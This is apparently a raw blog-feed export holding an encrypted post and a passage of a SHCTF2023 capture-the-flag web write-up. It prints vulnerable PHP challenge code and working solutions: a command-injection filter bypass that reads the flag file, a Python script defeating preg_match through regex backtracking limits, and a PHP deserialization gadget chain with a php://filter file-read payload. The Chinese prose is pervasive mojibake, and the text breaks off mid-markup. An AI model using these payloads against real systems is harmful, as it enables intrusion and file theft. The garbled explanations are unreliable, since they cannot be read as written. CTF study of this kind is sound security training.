42e1c35f1ab561f3e7f8f4cb789771675ea4878009344cfa7e9d7c79a9737684f727a4b92bacdedc3c910ebe886f9daed55b31015eb9596ac497530ed8d7d327905abcaffecd957a1daf71f66a6a2f6338569d4cc701539a2efde49b84551e11c4e1ac7a4a9ef9d7365d4bddb7cec2f53fe9e37f75e6d245d70997c4e9437a1417353913c432fe7c716792ff5d6d9789f2254fd3bcb69b075095cf214a55e4bba49f9496d4ee89892a1813957ecde5d7dda15dac9c110d605f59d3884a033da40173401d2784f5a10e9ab18872836885e384b74734ab5888d82e1418a2b2a367865e2ad78dc9923bebf1d5bad6e40147411cf41dc79ddae831e0cbc258d51262b855386f6679e3c591bd25010a298e889dbb8b0922c739c1252c43bd51aa082a6762e1c96e6c1261094398ca870cbf33c33d51a9296a7649edbee707fe95cafb12837eb6c0eca2bd227b5460e99b32e525cb7970c46880d7dca3eb665b5fbcf040ccd4141f9f64ec9e702659e5a2e4a1122091e267f76994103a28b67309cf99299f250dcbd2bdbedb53fe9d90ba8eaa0d7077945805947008e02d4ed723479a0bb5d6a95d9b1b9551eb3d9243bd2ac6cc29b018f14f1485475ed28879f9aa0c0e2c471b5f9bfc98091a62669a9a804a3171995fe583349c574f3b64774d8cbd0f53ead89731b7cc772a30e63efade854cbe42941e8bac4dd133fa68065dba4541f7f1248faeadba3a39a4c805324eb87cef821a831cfee4d56d691db3998ef08fcadaf76a3113de6480c15ef398ef4ab4a785d897139eb6057c7dfdfd270cf2f1d7ca3302c2997c964a647d9ccb6af716a9d880ff2fc2775dc182718754a56b422cdb69bb45d700acf9a592fa8799df422f50cd2f6fef25eb0331d057af3aa553339741451fc1ba5be9f490920b415e039de24b5e30be36dda590b52cb0b46667d2f9e5d51dd968810c10a2b42e350f42de34705fe476c0289939d81a6c6ce967d1d3fb79913031a0cef0ccf886914b5c66027e0ee0b15c5a347e78228806dd531f5b8272d99a8ff5ec180eafe429ec854cb624bc8442cb32fc5eb3fe4dd7b4b48c8e2b1739d047127b55a28a2c91793c02e4b4f948f887d4df3d79908d05e730de96d8fefdc1a18f85ac08a36710c80a59bfa4c487be131271917ed93041ffaba94634764594578e308611135009b2051cf384f31fe5a6fb8a1eb3dc6a450c3dc601a5a02fb9c05f9b3a27a95d19cbb7f2453c0cd1a5f13e6938886e4cb5a2c4de1a18dfc84d6357092bd36416f4d9bb18c0a079f3a26b0651e6b428660762697f56e6e4129d4c84d4bc64ccdfb41d6a0f9a0fa58e5cb3602fa075da4f2ad2e84f20c9a35ed7712bc09caa1c3e50f93441aa342f8f866587ed6bb4fd599f82551c107794bfb1b5a662688b29cd23be6d029e3c35763b61bc568730a37581ef1bee25b7849e3390d0445037295d005807c27c457c8223bc92a499b9f7afd91aef053c3eea1bbbd078141221e0b7c0ac735157aac5fd910ae2f671737d1864e858f01c31c14baf8f5fda8de0e7e7399abc60b8f5f871a6dee7cec6c6657402bd170f4d091ee0032e1f659750e799c0bac72aea0794d77a7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF2023</title>
      <link href="/2023/10/06/SHCTF2023/"/>
      <url>/2023/10/06/SHCTF2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h3><p>ËÄÉÁÇπÔºöÂëΩ‰ª§ÊâßË°åÁªïËøá</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\&lt;|\'|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hhhhhhacker!!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§‰∫ÜcatÔºå‰ΩøÁî®<code>rce=c\at$&#123;IFS&#125;/fl??</code>„ÄÇ</p><h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h3><p>ËÄÉÁÇπÔºöÊï∞ÁªÑÁªïËøáÔºåÂõûÊ∫ØÁªïËøápreg_match</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./index.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÈ¶ñÂÖàË¶ÅÂåπÈÖçSHCTFÂâçÈù¢ÊòØÂê¶ÊúâÂ≠óÁ¨¶ÔºåÁî±‰∫éÊúâ**.**ÁöÑÈôêÂà∂Ôºå‰ª•Âèä&#x2F;is‰øÆÈ•∞Á¨¶ÁöÑÈôêÂà∂Ôºö</p><blockquote><ul><li>i (PCRE_CASELESS)<br>Â¶ÇÊûúËÆæÁΩÆ‰∫ÜËøô‰∏™‰øÆÈ•∞Á¨¶ÔºåÊ®°Âºè‰∏≠ÁöÑÂ≠óÊØç‰ºöËøõË°åÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÂåπÈÖç„ÄÇ</li><li>s (PCRE_DOTALL)<br>Â¶ÇÊûúËÆæÁΩÆ‰∫ÜËøô‰∏™‰øÆÈ•∞Á¨¶ÔºåÊ®°Âºè‰∏≠ÁöÑÁÇπÂè∑ÂÖÉÂ≠óÁ¨¶ÂåπÈÖçÊâÄÊúâÂ≠óÁ¨¶ÔºåÂåÖÂê´Êç¢Ë°åÁ¨¶„ÄÇÂ¶ÇÊûúÊ≤°ÊúâËøô‰∏™ ‰øÆÈ•∞Á¨¶ÔºåÁÇπÂè∑‰∏çÂåπÈÖçÊç¢Ë°åÁ¨¶„ÄÇËøô‰∏™‰øÆÈ•∞Á¨¶Á≠âÂêå‰∫é perl ‰∏≠ÁöÑ&#x2F;s‰øÆÈ•∞Á¨¶„ÄÇ ‰∏Ä‰∏™ÂèñÂèçÂ≠óÁ¨¶Á±ªÊØîÂ¶Ç [^a] ÊÄªÊòØÂåπÈÖçÊç¢Ë°åÁ¨¶ÔºåËÄå‰∏ç‰æùËµñ‰∫éËøô‰∏™‰øÆÈ•∞Á¨¶ÁöÑËÆæÁΩÆ„ÄÇ</li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/3557032fdb5c4508b9d2d555b8040c38.png" alt="1"></p><p>ËøôË°å‰ª£Á†ÅÁöÑ‰ΩúÁî®ÊòØÊ£ÄÊü•ÂèòÈáè $code ‰∏≠ÊòØÂê¶ÂåÖÂê´‰ªªÊÑèÂ≠óÁ¨¶ÔºàÂåÖÊã¨Êç¢Ë°åÁ¨¶ÔºâÔºåÁÑ∂ÂêéÁ¥ßË∑üÁùÄ SHCTFÔºà‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºâ„ÄÇÂ¶ÇÊûúÂåπÈÖçÊàêÂäüÔºåÊù°‰ª∂ËØ≠Âè•Â∞±‰ºö‰∏∫ÁúüÔºàtrueÔºâÔºåÂèØ‰ª•ÊâßË°åÊù°‰ª∂‰∏∫ÁúüÊó∂ÁöÑ‰ª£Á†ÅÂùó„ÄÇ</p><p><strong>ËøôÈáåÂèØ‰ª•‰ΩøÁî®Ê≠£ÂàôÂõûÊ∫ØÊúÄÂ§ßÊ¨°Êï∞‰∏äÈôêÁªïËøápreg_match</strong><a href="https://xz.aliyun.com/t/10219">ÂèÇËÄÉÈìæÊé•</a><br>ÊúÄÂêéÁöÑpythonËÑöÊú¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># ÁõÆÊ†áURL</span>url <span class="token operator">=</span> <span class="token string">'http://112.6.51.212:31314/?num[]=m'</span>  <span class="token comment"># ËØ∑ÊõøÊç¢‰∏∫ÂÆûÈôÖÁöÑÁõÆÊ†áURL</span><span class="token comment"># Ë¶ÅÂèëÈÄÅÁöÑPOSTÂèÇÊï∞</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'c_ode'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">260000</span><span class="token operator">+</span><span class="token string">'2023SHCTF'</span><span class="token punctuation">&#125;</span><span class="token comment"># ÂèëÈÄÅPOSTËØ∑Ê±Ç</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># ÊâìÂç∞ÂìçÂ∫îÂÜÖÂÆπ</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áü•ËØÜÁÇπÔºö<br><a href="https://www.sqlsec.com/2020/07/preg_replace.html">ÂõΩÂÖâÂ∏àÂÇÖÁöÑPHP preg_Á≥ªÂàóÊºèÊ¥ûÂ∞èÁªì</a></p><h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h3><p>ËÄÉÁÇπÔºöphpÂèçÂ∫èÂàóÂåñ<br>‰∏çÂ§™ÊìÖÈïøphpÂèçÂ∫èÂàóÂåñÔºåËøòÊòØË¶ÅÂ•ΩÂ•ΩÁúãÊØè‰∏ÄÈÅìÂèçÂ∫èÂàóÂåñÈ¢ò„ÄÇ„ÄÇ„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">q</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖ≥ÈîÆÊòØAÁ±ª‰∏≠ÁöÑ<strong>include()ÂáΩÊï∞</strong>ÈÄöËøáÊñá‰ª∂ÂåÖÂê´ÊãøÂà∞flag„ÄÇ<br>ÂºÄÂßã‰∏≤ÈìæÂ≠ê„ÄÇ„ÄÇ„ÄÇ</p><p><code>** __invokeÈ≠îÊúØÊñπÊ≥ï**</code></p><blockquote><p>È≠îÊúØÊñπÊ≥ï __invoke() ‰ºöÂú®Â∞Ü‰∏Ä‰∏™ÂØπË±°ÂΩì‰Ωú‰∏Ä‰∏™ÊñπÊ≥ïÊù•‰ΩøÁî®Êó∂‰ºöËá™Âä®Ë∞ÉÁî®„ÄÇ<br>‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÔºåÊàë‰ª¨Áªô <code>Person</code> Á±ªÊ∑ªÂä†‰∏ä <code>__invoke()</code> È≠îÊúØÊñπÊ≥ïÔºåÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•Â∞ÜÂÆÉÁöÑÂÆû‰æãÂΩì‰ΩúÊôÆÈÄöÊñπÊ≥ïÊù•Ë∞ÉÁî®‰∫Ü„ÄÇ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'‰Ω†Â•ΩÔºåÊàëÁöÑÂêçÂ≠óÊòØ: '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'ÔºåÊàë '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">.</span><span class="token string single-quoted-string">' Â≤Å‰∫Ü„ÄÇ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Yufei'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÈÇ£‰πàÂ¶ÇÊûúÂ∞ÜAÁ±ª‰∏éÂÖ∂‰ªñÁ±ªÁõ∏ËøûÔºåÈÇ£Â∞±Ê†πÊçÆ<code>__invoke()</code>‰∏éDÁ±ªÁõ∏ÂÖ≥Ëµ∑Êù•„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜÂØπË±°ÂΩìÊàê‰∫Ü‰∏Ä‰∏™ÊñπÊ≥ï‰ºöË∞ÉÁî®__invoke()„ÄÇ</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BÁ±ª‰∏≠Ëß¶Âèë<code>__wakeup()</code>Ôºö</p><blockquote><p>ÂΩì‰ΩøÁî® unserialize() ÂèçÂ∫èÂàóÂåñ‰∏Ä‰∏™ÂØπË±°ÊàêÂäüÂêéÔºå‰ºöËá™Âä®Ë∞ÉÁî®ËØ•ÂØπË±°ÁöÑ __wakup() È≠îÊúØÊñπÊ≥ï„ÄÇ</p></blockquote><p>CÁ±ª‰∏≠Ëß¶Âèë<code>__toString()</code>Ôºö</p><blockquote><p>Âú®ÊääÂØπË±°ËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Êó∂Ëá™Âä®Ë∞ÉÁî®</p></blockquote><p>ÊúÄÂêéÁöÑ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 